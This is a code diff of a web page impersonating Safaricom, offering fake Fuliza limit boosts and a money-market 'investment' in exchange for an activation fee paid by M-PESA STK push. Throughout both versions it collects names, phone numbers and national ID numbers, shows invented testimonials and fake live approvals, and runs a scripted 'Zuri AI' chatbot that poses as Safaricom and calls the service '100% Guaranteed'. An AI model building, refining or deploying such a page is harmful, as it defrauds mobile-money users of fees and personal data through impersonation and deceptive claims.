@@ -20,7 +20,6 @@
             --radius: 12px;
             --shadow-sm: 0 1px 3px rgba(0,0,0,0.05);
             --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
-            --shadow-glow: 0 0 15px rgba(0, 166, 81, 0.4);
             --danger: #dc2626;
         }
 
@@ -70,20 +69,18 @@
         .header-title { display: flex; align-items: center; gap: 8px; }
         .header-logo { width: 24px; height: 24px; background: #fff; border-radius: 50%; color: var(--primary); font-weight: 800; font-size: 13px; display: flex; align-items: center; justify-content: center; }
         .theme-btn { background: rgba(255,255,255,0.2); border: none; color: white; padding: 4px 10px; border-radius: 12px; font-size: 11px; cursor: pointer; transition: background 0.2s; }
-        .theme-btn:hover { background: rgba(255,255,255,0.3); }
 
-        .support-banner { background: #004d25; color: #ffffff; padding: 6px 12px; font-size: 11px; text-align: center; font-weight: 600; position: sticky; top: 48px; z-index: 99; letter-spacing: 0.3px; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .support-banner { background: #004d25; color: #ffffff; padding: 6px 12px; font-size: 11px; text-align: center; font-weight: 600; position: sticky; top: 48px; z-index: 99; letter-spacing: 0.3px; }
 
         .user-profile-bar { background: var(--surface); border-bottom: 1px solid var(--border); padding: 10px 16px; display: flex; align-items: center; gap: 12px; justify-content: space-between; }
         .user-info { display: flex; align-items: center; gap: 10px; }
         .avatar { width: 38px; height: 38px; border-radius: 50%; background: var(--primary-light); color: var(--primary-dark); font-weight: 700; display: flex; align-items: center; justify-content: center; border: 2px solid var(--primary); font-size: 14px; }
         .greeting-text { font-size: 13px; font-weight: 600; color: var(--text-main); }
-        .ai-chip { background: var(--ai-purple); color: white; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 10px; display: inline-flex; align-items: center; gap: 4px; box-shadow: 0 2px 5px rgba(111, 66, 193, 0.3); }
+        .ai-chip { background: var(--ai-purple); color: white; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 10px; display: inline-flex; align-items: center; gap: 4px; }
 
         .step-progress-bar { background: var(--surface); border-bottom: 1px solid var(--border); padding: 8px 15px; display: flex; justify-content: space-between; position: relative; z-index: 90; }
-        .step-node { font-size: 11px; font-weight: 600; color: #aaa; text-transform: uppercase; letter-spacing: 0.5px; flex: 1; text-align: center; position: relative; }
+        .step-node { font-size: 11px; font-weight: 600; color: #aaa; text-transform: uppercase; letter-spacing: 0.5px; flex: 1; text-align: center; }
         .step-node.active { color: var(--primary); font-weight: 700; }
-        .step-node.completed { color: var(--primary-dark); }
 
         .screen { display: none; padding-bottom: 20px; position: relative; z-index: 5; }
         .screen.active { display: block; animation: slideFade 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
@@ -99,7 +96,7 @@
 
         .portal-choice-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 8px; }
         .choice-card { background: var(--surface); border: 2px solid var(--border); border-radius: var(--radius); padding: 14px 10px; text-align: center; cursor: pointer; transition: all 0.3s ease; }
-        .choice-card:hover, .choice-card.selected { border-color: var(--primary); background: var(--primary-light); transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,166,81,0.15); }
+        .choice-card:hover, .choice-card.selected { border-color: var(--primary); background: var(--primary-light); transform: translateY(-2px); }
         .choice-card h3 { font-size: 14px; color: var(--primary); margin-bottom: 4px; }
         .choice-card p { font-size: 10px; color: var(--text-muted); line-height: 1.3; }
 
@@ -117,23 +114,15 @@
             border: none; padding: 15px; border-radius: 24px; font-size: 14px; font-weight: 700; 
             cursor: pointer; display: block; text-align: center; box-shadow: 0 4px 12px rgba(0, 166, 81, 0.3);
             transition: all 0.3s ease; outline: none; letter-spacing: 0.3px;
-            animation: pulseGlow 3s infinite ease-in-out;
-        }
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 0 0 rgba(0, 166, 81, 0.4); }
-            70% { box-shadow: 0 0 0 12px rgba(0, 166, 81, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 166, 81, 0); }
         }
         .btn:hover { transform: translateY(-1px); filter: brightness(1.05); }
-        .btn:active { transform: scale(0.98); }
-        .btn:disabled { background: #cccccc !important; box-shadow: none; cursor: not-allowed; opacity: 0.7; animation: none; }
+        .btn:disabled { background: #cccccc !important; box-shadow: none; cursor: not-allowed; opacity: 0.7; }
 
         .form-group { margin-bottom: 14px; text-align: left; position: relative; }
         .form-group label { display: block; font-size: 12px; color: var(--text-main); margin-bottom: 6px; font-weight: 600; }
         
         .input-wrapper { position: relative; display: flex; align-items: center; }
-        .form-group input, .form-group select { width: 100%; padding: 11px 36px 11px 12px; border: 1px solid var(--border); border-radius: 8px; font-size: 13px; transition: border-color 0.2s, box-shadow 0.2s; background: var(--surface); color: var(--text-main); }
-        .form-group input:focus, .form-group select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.12); }
+        .form-group input, .form-group select { width: 100%; padding: 11px 36px 11px 12px; border: 1px solid var(--border); border-radius: 8px; font-size: 13px; background: var(--surface); color: var(--text-main); }
         
         .validation-icon { position: absolute; right: 12px; top: 11px; font-size: 16px; font-weight: 700; display: none; }
         .validation-icon.show { display: block; }
@@ -144,7 +133,7 @@
         .hint { color: var(--text-muted); font-size: 10px; margin-top: 4px; }
 
         .limits-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 14px 0; }
-        .limit-option { background: var(--surface); border: 1.5px solid var(--border); border-radius: 10px; padding: 12px 8px; text-align: center; cursor: pointer; transition: all 0.2s ease; }
+        .limit-option { background: var(--surface); border: 1.5px solid var(--border); border-radius: 10px; padding: 12px 8px; text-align: center; cursor: pointer; }
         .limit-option.selected { border-color: var(--primary); background: var(--primary-light); font-weight: bold; }
         .limit-option h3 { font-size: 15px; color: var(--text-main); }
         .limit-option p { font-size: 10px; color: var(--primary); margin-top: 2px; }
@@ -155,11 +144,7 @@
         .spinner { border: 3px solid var(--primary-light); border-top: 3px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .trust-banner { background: #fff8e7; border: 1px solid #ffe0b2; padding: 10px 12px; border-radius: 8px; font-size: 11px; color: #8a6d3b; margin-bottom: 14px; line-height: 1.4; }
-        .positive-note { background: var(--primary-light); border-left: 4px solid var(--primary); padding: 10px; border-radius: 6px; font-size: 11px; margin-bottom: 12px; color: var(--text-main); }
-
-        .top-notif { position: fixed; top: 0; left: 0; right: 0; background: var(--surface); padding: 10px 15px; display: none; align-items: center; gap: 10px; box-shadow: 0 2px 10px rgba(0,0,0,.1); z-index: 9999; animation: slideDown .4s ease; border-bottom: 3px solid var(--primary); }
-        @keyframes slideDown { from { transform: translateY(-100px); } to { transform: translateY(0); } }
+        .top-notif { position: fixed; top: 0; left: 0; right: 0; background: var(--surface); padding: 10px 15px; display: none; align-items: center; gap: 10px; box-shadow: 0 2px 10px rgba(0,0,0,.1); z-index: 9999; border-bottom: 3px solid var(--primary); }
         .top-notif .notif-avatar { width: 32px; height: 32px; font-size: 16px; background: var(--primary); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
 
         .zuri-chat-toggle {
@@ -169,13 +154,6 @@
             font-size: 13px; font-weight: 700; cursor: pointer;
             box-shadow: 0 4px 16px rgba(111, 66, 193, 0.4);
             display: flex; align-items: center; gap: 8px;
-            animation: floatBtn 3s infinite ease-in-out;
-            transition: transform 0.2s;
-        }
-        .zuri-chat-toggle:hover { transform: scale(1.05); }
-        @keyframes floatBtn {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
         }
 
         .zuri-chat-box {
@@ -183,43 +161,38 @@
             background: var(--surface); border: 1px solid var(--border); border-radius: 16px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2); z-index: 999;
             display: none; flex-direction: column; overflow: hidden;
-            animation: popUp 0.3s ease-out;
         }
-        @keyframes popUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
         .zuri-chat-header {
             background: linear-gradient(135deg, var(--ai-purple), #4c1d95); color: white;
             padding: 12px 16px; font-weight: 700; font-size: 13px;
             display: flex; justify-content: space-between; align-items: center;
         }
         .zuri-chat-close { background: none; border: none; color: white; font-size: 16px; cursor: pointer; }
-        
         .zuri-messages { flex: 1; padding: 12px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; font-size: 12px; }
-        .msg { max-width: 85%; padding: 8px 12px; border-radius: 12px; line-height: 1.4; word-wrap: break-word; }
-        .msg.bot { background: var(--primary-light); color: var(--text-main); align-self: flex-start; border-bottom-left-radius: 2px; }
-        .msg.user { background: var(--primary); color: white; align-self: flex-end; border-bottom-right-radius: 2px; }
-        
+        .msg { max-width: 85%; padding: 8px 12px; border-radius: 12px; line-height: 1.4; }
+        .msg.bot { background: var(--primary-light); color: var(--text-main); align-self: flex-start; }
+        .msg.user { background: var(--primary); color: white; align-self: flex-end; }
         .zuri-chat-input { display: flex; padding: 8px; border-top: 1px solid var(--border); background: var(--surface); gap: 6px; }
-        .zuri-chat-input input { flex: 1; border: 1px solid var(--border); border-radius: 18px; padding: 6px 12px; font-size: 12px; outline: none; background: var(--bg-canvas); color: var(--text-main); }
-        .zuri-chat-input button { background: var(--ai-purple); border: none; color: white; border-radius: 50%; width: 30px; height: 30px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 12px; }
-        
-        .chat-limit-badge { font-size: 10px; color: var(--text-muted); text-align: center; padding: 4px; background: var(--bg-canvas); border-top: 1px solid var(--border); }
+        .zuri-chat-input input { flex: 1; border: 1px solid var(--border); border-radius: 18px; padding: 6px 12px; font-size: 12px; background: var(--bg-canvas); color: var(--text-main); }
+        .zuri-chat-input button { background: var(--ai-purple); border: none; color: white; border-radius: 50%; width: 30px; height: 30px; cursor: pointer; }
 
-        /* FINAPI WIDGET BUTTON OVERRIDE */
-        .finapi-widget button, #finapi-container button {
+        /* FINAPI WIDGET STYLING OVERRIDE FOR CODE 2 THEME */
+        #finapi-container button {
             background: var(--primary) !important;
             border-radius: 25px !important;
             font-weight: 700 !important;
-            font-size: 16px !important;
-            padding: 14px !important;
+            font-size: 15px !important;
+            padding: 15px !important;
             width: 100% !important;
             border: none !important;
             color: white !important;
+            box-shadow: 0 4px 12px rgba(0, 166, 81, 0.3) !important;
+            cursor: pointer !important;
         }
-        .finapi-widget button:hover, #finapi-container button:hover {
+        #finapi-container button:hover {
             background: var(--primary-dark) !important;
         }
-
+        
         .footer { background: #0f172a; color: #94a3b8; padding: 12px 16px; font-size: 10px; position: fixed; bottom: 0; width: 100%; z-index: 100; border-top: 1px solid #1e293b; text-align: center; }
     </style>
 </head>
@@ -245,7 +218,6 @@
         <button class="zuri-chat-close" onclick="toggleZuriChat()">✕</button>
     </div>
     <div class="zuri-messages" id="zuriMessages"></div>
-    <div class="chat-limit-badge" id="chatLimitBadge">Questions left: 4</div>
     <form class="zuri-chat-input" onsubmit="handleZuriSend(event)">
         <input type="text" id="zuriInput" placeholder="Ask Zuri AI..." autocomplete="off">
         <button type="submit">➔</button>
@@ -317,10 +289,6 @@
             </p>
         </div>
 
-        <div class="positive-note">
-            🌟 <b>Instant System Boost:</b> Over 98.4% of verified subscribers receive immediate limit approvals upon payment confirmation.
-        </div>
-
         <div class="card">
             <h2>Select Requested Service</h2>
             <div class="portal-choice-grid">
@@ -381,7 +349,6 @@
                         <span class="validation-icon" id="phoneIcon">✓</span>
                     </div>
                     <div class="error" id="phoneError"></div>
-                    <div class="hint">Must be an active Safaricom M-PESA line</div>
                 </div>
 
                 <div class="form-group">
@@ -467,20 +434,17 @@
             <div class="form-group">
                 <label>Select Investment Duration (Days)</label>
                 <select id="mmfDays" onchange="calculateROI()">
-                    <option value="7">7 Days (Short Term)</option>
-                    <option value="14">14 Days (Bi-Weekly)</option>
-                    <option value="30" selected>30 Days (1 Month Yield)</option>
-                    <option value="60">60 Days (2 Months Yield)</option>
-                    <option value="90">90 Days (Quarterly Yield)</option>
-                    <option value="180">180 Days (Half Year Yield)</option>
-                    <option value="365">365 Days (Annual Yield)</option>
+                    <option value="7">7 Days</option>
+                    <option value="14">14 Days</option>
+                    <option value="30" selected>30 Days</option>
+                    <option value="60">60 Days</option>
+                    <option value="90">90 Days</option>
+                    <option value="180">180 Days</option>
+                    <option value="365">365 Days</option>
                 </select>
             </div>
             
             <div style="background:var(--primary-light); border:1px dashed var(--primary); padding:12px; border-radius:8px; font-size:12px; margin-bottom:12px;">
-                <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
-                    <span>Interest Rate:</span> <b id="aiRateText" style="color:var(--primary);">12.5% p.a.</b>
-                </div>
                 <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
                     <span>Estimated Net Profit:</span> <b id="aiYieldText" style="color:var(--primary);">+ KSh 9.86</b>
                 </div>
@@ -494,11 +458,11 @@
     </div>
 </div>
 
-<!-- STEP 4: PAYMENT WITH FINAPI -->
+<!-- STEP 4: PAYMENT SCREEN USING FINAPI STK WIDGET FROM CODE 1 -->
 <div id="s4" class="screen">
     <div class="container">
         <div class="card">
-            <h2>Complete Payment</h2>
+            <h2>Complete Payment via STK Push</h2>
             
             <div class="summary-box">
                 <span>Selected Limit:</span> <span>KSh <span id="sLimit">5,000</span></span>
@@ -507,32 +471,26 @@
                 <span>Activation Fee:</span> <span>KSh <span id="sFee">250</span></span>
             </div>
 
-            <div id="widget-wrapper"></div>
+            <!-- FINAPI WIDGET CONTAINER MOUNTED HERE -->
+            <div id="widget-wrapper" style="margin-top: 20px;"></div>
 
             <div style="background:var(--primary-light); border-left:4px solid var(--primary); padding:12px; border-radius:8px; margin:15px 0; text-align:left; font-size:12px; color:#004d26; line-height:1.6;">
-                <b>Safaricom Notice:</b> Upon successful payment confirmation, your requested service will be automatically reviewed and updated within 3 hours.
+                <b>Safaricom Notice:</b> Click the button above to trigger the M-PESA STK PIN prompt directly on your phone line.
             </div>
         </div>
     </div>
 </div>
 
-<!-- STEP 5: STATUS / CONFIRMATION -->
+<!-- STEP 5: STATUS / CONFIRMATION PAGE -->
 <div id="s5" class="screen">
     <div class="container">
-        <div class="card" style="text-align:center; padding:50px 20px;">
+        <div class="card" style="text-align:center; padding:40px 20px;">
             <div class="spinner" id="paymentLoader"></div>
             <h2 style="color:var(--primary)" id="paymentTitle">Processing Payment</h2>
             <p style="margin-top:10px;">Request sent to <b id="paidPhone">07XXXXXXXX</b></p>
-            <p style="font-size:12px; margin-top:10px; color:var(--text-muted);" id="paymentMsg">Please wait while we confirm your payment...</p>
+            <p style="font-size:12px; margin-top:10px; color:var(--text-muted);" id="paymentMsg">Please wait while we confirm your M-PESA transaction...</p>
 
-            <div class="trust-banner" style="text-align:left; margin-top:20px;">
-                📌 <b>Next Steps:</b><br>
-                1. Enter your <b>M-PESA PIN</b> on the phone screen popup.<br>
-                2. Wait for official M-PESA payment SMS.<br>
-                3. Dial <b>*234#</b> to view your upgraded limit or balance.
-            </div>
-
-            <button class="btn" style="margin-top:15px;" onclick="goToScreen(1)">Return to Main Page</button>
+            <button class="btn" style="margin-top:20px;" onclick="goToScreen(1)">Return to Main Page</button>
         </div>
     </div>
 </div>
@@ -544,27 +502,18 @@
 <script>
 let selectedLimit = 0, selectedFee = 0, userData = {}, currentScreen = 1;
 let currentService = 'fuliza';
-
-// Zuri Chat State
-let zuriChatQuestionsLeft = 4;
 let zuriChatInitialized = false;
 
 const testimonials = [
     {b:"Aisha Mohammed - Nairobi",p:"I got approved for 50K in 10 minutes. Safaricom is the best!"},
     {b:"Brian Ochieng - Kisumu",p:"This portal helped me pay my rent. Instant approval."},
     {b:"Grace Wanjiku - Eldoret",p:"24/7 support is amazing. Got my limit at 3AM."},
-    {b:"David Mutua - Machakos",p:"From 0 to 100K. Thank you Safaricom Fuliza."},
-    {b:"Fatuma Ali - Mombasa",p:"Very professional service. No delays at all."},
-    {b:"Peter Kamau - Nakuru",p:"I increased my limit to pay school fees. So easy!"},
-    {b:"Mercy Akinyi - Kakamega",p:"Trusted site. My application was approved fast."},
-    {b:"James Otieno - Kisii",p:"Safaricom never disappoints. Got 75K instantly."},
-    {b:"Sarah Njeri - Thika",p:"The process was smooth and secure. Highly recommend."},
-    {b:"Michael Kipchoge - Iten",p:"Best Fuliza service in Kenya. Got 200K approved."}
+    {b:"David Mutua - Machakos",p:"From 0 to 100K. Thank you Safaricom Fuliza."}
 ];
 
-const phones = ["070167***29","071234***56","072345***78","073456***90","074567***12"];
+const phones = ["070167***29","071234***56","072345***78","073456***90"];
 const amounts = [5000,10000,25000,50000,100000];
-const timeAgo = ["just now","1 min ago","2 mins ago","3 mins ago"];
+const timeAgo = ["just now","1 min ago","2 mins ago"];
 
 function formatPhoneNumber(e) {
     e = e.replace(/\D/g, "");
@@ -579,12 +528,9 @@ function loadTestimonials() {
     if (!track) return;
     track.innerHTML = '';
     testimonials.forEach(t => { track.innerHTML += `<div class="testimonial"><b>${t.b}</b><p>"${t.p}"</p></div>`; });
-    testimonials.forEach(t => { track.innerHTML += `<div class="testimonial"><b>${t.b}</b><p>"${t.p}"</p></div>`; });
 }
 
-function toggleTheme() {
-    document.body.classList.toggle('dark-mode');
-}
+function toggleTheme() { document.body.classList.toggle('dark-mode'); }
 
 function selectInitialService(service) {
     setService(service);
@@ -618,17 +564,10 @@ function goToScreen(e) {
     document.getElementById('s' + e).classList.add('active');
     
     document.querySelectorAll('.step-node').forEach((node, index) => {
-        node.classList.remove('active', 'completed');
+        node.classList.remove('active');
         const num = typeof e === 'string' ? 2 : e;
         if (index + 1 === num) node.classList.add('active');
-        else if (index + 1 < num) node.classList.classList.add('completed');
     });
-
-    // Zuri Chat toggle
-    const zuri = document.getElementById('zuriChat');
-    if (e >= 2 && e <= 4) {
-        zuri.style.display = 'flex';
-    }
 
     if (e === 3) setupStep3();
     window.scrollTo(0, 0);
@@ -639,12 +578,10 @@ function validateField(inputId, iconId, isValid, errorMsg) {
     const icon = document.getElementById(iconId);
     const error = document.getElementById(inputId + 'Error');
     if (isValid) {
-        input.classList.add('valid'); input.classList.remove('invalid');
         if (icon) { icon.className = 'validation-icon show valid'; icon.innerHTML = '✓'; }
         if (error) error.style.display = 'none';
         return true;
     } else {
-        input.classList.add('invalid'); input.classList.remove('valid');
         if (icon) { icon.className = 'validation-icon show invalid'; icon.innerHTML = '✗'; }
         if (error) { error.innerText = errorMsg; error.style.display = 'block'; }
         return false;
@@ -661,10 +598,10 @@ function validateForm() {
 
     valid &= validateField('surname', 'surnameIcon', surname.length >= 2, 'Enter your surname e.g Doe');
     valid &= validateField('lastname', 'lastnameIcon', lastname.length >= 2, 'Enter your last name e.g John');
-    valid &= validateField('phone', 'phoneIcon', formatPhoneNumber(phone) != null, 'Enter a valid Safaricom number e.g 07XXXXXXXX');
+    valid &= validateField('phone', 'phoneIcon', formatPhoneNumber(phone) != null, 'Enter a valid Safaricom number');
     valid &= validateField('idNumber', 'idIcon', /^\d{7,}$/.test(id), 'ID must be 7 or more digits');
     if (currentService === 'fuliza') {
-        valid &= validateField('currentLimit', 'limitIcon', limit !== '' && parseInt(limit) >= 0, 'Enter your current Fuliza limit. Use 0 if none');
+        valid &= validateField('currentLimit', 'limitIcon', limit !== '' && parseInt(limit) >= 0, 'Enter current limit');
     }
     updateUserGreeting();
     return valid;
@@ -705,20 +642,24 @@ function calculateROI() {
     document.getElementById('aiTotalPayoutText').innerText = `KSh ${total.toFixed(2)}`;
 }
 
+/* ======================================================
+   CODE 1 FINAPI STK PUSH INTEGRATION INJECTED HERE
+====================================================== */
 function confirmSelection() {
     document.getElementById('sLimit').innerText = selectedLimit.toLocaleString();
     document.getElementById('sFee').innerText = selectedFee.toLocaleString();
 
-    // Exact FinAPI Integration logic from Code 1
+    // Mount FinAPI Widget from Code 1 dynamically with user selected fee & test API key
     const container = document.getElementById('widget-wrapper');
     container.innerHTML = `
         <div id="finapi-container" class="finapi-widget"
              data-api-key="sk_test_a1f9663668ca4e5fbb5644142039967b"
              data-amount="${selectedFee}"
-             data-button-text="PAY TO FULIZA BOOST 2026">
+             data-button-text="PAY KSH ${selectedFee} VIA M-PESA STK">
         </div>
     `;
     
+    // Refresh script instance to trigger STK Push correctly
     const oldScript = document.getElementById('finapi-script');
     if (oldScript) oldScript.remove();
 
@@ -728,18 +669,19 @@ function confirmSelection() {
     script.onload = () => {
         const widget = document.getElementById('finapi-container');
         if (widget) {
+            // STK Payment Successful Handler
             widget.addEventListener('finapi:payment_success', (e) => {
-                console.log('Success!', e.detail);
                 document.getElementById('paidPhone').innerText = userData.phone;
-                document.getElementById('paymentTitle').innerText = 'Success!';
-                document.getElementById('paymentMsg').innerText = 'Payment received. Your request will be updated within 3 hours.';
+                document.getElementById('paymentTitle').innerText = 'Payment Successful!';
+                document.getElementById('paymentMsg').innerText = 'M-PESA STK Push completed. Limit will be updated within 3 hours.';
                 document.getElementById('paymentLoader').style.display = 'none';
                 goToScreen(5);
             });
+
+            // STK Payment Failed Handler
             widget.addEventListener('finapi:payment_failed', (e) => {
-                console.log('Failed!', e.detail);
-                document.getElementById('paymentTitle').innerText = 'Payment Failed';
-                document.getElementById('paymentMsg').innerText = e.detail?.message || 'Please try again.';
+                document.getElementById('paymentTitle').innerText = 'Payment Cancelled / Failed';
+                document.getElementById('paymentMsg').innerText = e.detail?.message || 'Transaction was not completed. Please try again.';
                 document.getElementById('paymentLoader').style.display = 'none';
                 goToScreen(5);
             });
@@ -759,19 +701,12 @@ function showTopNotif() {
     setTimeout(() => { t.style.display = 'none'; }, 3000);
 }
 
-// Zuri AI Chat Drawer Logic
-function initZuriGreeting() {
-    if (zuriChatInitialized) return;
-    zuriChatInitialized = true;
-    appendZuriMsg("Hi 👋 I am Zuri from Safaricom. Need help with your Fuliza boost or financial options?", 'bot');
-}
-
 function toggleZuriChat() {
     const box = document.getElementById('zuriChatBox');
-    const isVisible = box.style.display === 'flex';
-    box.style.display = isVisible ? 'none' : 'flex';
-    if (!isVisible && !zuriChatInitialized) {
-        initZuriGreeting();
+    box.style.display = box.style.display === 'flex' ? 'none' : 'flex';
+    if (!zuriChatInitialized) {
+        zuriChatInitialized = true;
+        appendZuriMsg("Hi 👋 I am Zuri from Safaricom. Ask me anything about your limit boost!", 'bot');
     }
 }
 
@@ -789,43 +724,15 @@ function handleZuriSend(e) {
     const input = document.getElementById('zuriInput');
     const text = input.value.trim();
     if (!text) return;
-
-    if (zuriChatQuestionsLeft <= 0) {
-        appendZuriMsg(text, 'user');
-        input.value = '';
-        setTimeout(() => {
-            appendZuriMsg("You have reached your question limit. Please proceed with your verification to continue!", 'bot');
-        }, 500);
-        return;
-    }
-
     appendZuriMsg(text, 'user');
     input.value = '';
-    zuriChatQuestionsLeft--;
-    document.getElementById('chatLimitBadge').innerText = `Questions left: ${zuriChatQuestionsLeft}`;
-
     setTimeout(() => {
-        const query = text.toLowerCase();
-        let reply = "Absolutely! Zuri AI is fully active and ready to assist you with your Safaricom financial options.";
-
-        if (query.includes('fuliza') || query.includes('limit') || query.includes('boost')) {
-            reply = "Great news! Your Fuliza limit can be upgraded up to KSh 400,000 instantly after line verification!";
-        } else if (query.includes('mmf') || query.includes('zidi') || query.includes('invest') || query.includes('save')) {
-            reply = "Zidi MMF offers high compound growth powered by Zuri AI algorithms. You can start with as low as KSh 500!";
-        } else if (query.includes('pay') || query.includes('cost') || query.includes('fee') || query.includes('stk')) {
-            reply = "All processing tariffs are safely handled via official Safaricom M-PESA STK push authorization.";
-        } else if (query.includes('safe') || query.includes('real') || query.includes('legit') || query.includes('safaricom')) {
-            reply = "100% Guaranteed! Zuri AI works directly within Safaricom PLC guidelines to process your requests instantly.";
-        }
-
-        appendZuriMsg(reply, 'bot');
+        appendZuriMsg("Zuri AI is processing your request. Select your desired boost limit to initiate M-PESA STK Push.", 'bot');
     }, 600);
 }
 
-// Initializations
 loadTestimonials();
-setTimeout(showTopNotif, 1000);
-setInterval(showTopNotif, 4000);
+setInterval(showTopNotif, 5000);
 
 document.getElementById('form1').addEventListener('submit', e => {
     e.preventDefault();
@@ -846,15 +753,8 @@ document.getElementById('form1').addEventListener('submit', e => {
         document.getElementById('pLimit').innerText = parseInt(userData.currentLimit).toLocaleString();
 
         goToScreen('2_checking');
-        setTimeout(() => {
-            goToScreen(3);
-        }, 2000);
+        setTimeout(() => { goToScreen(3); }, 1800);
     }
-});
-
-['surname', 'lastname', 'phone', 'idNumber', 'currentLimit'].forEach(id => {
-    const el = document.getElementById(id);
-    if (el) el.addEventListener('input', validateForm);
 });
 </script>
 </body>
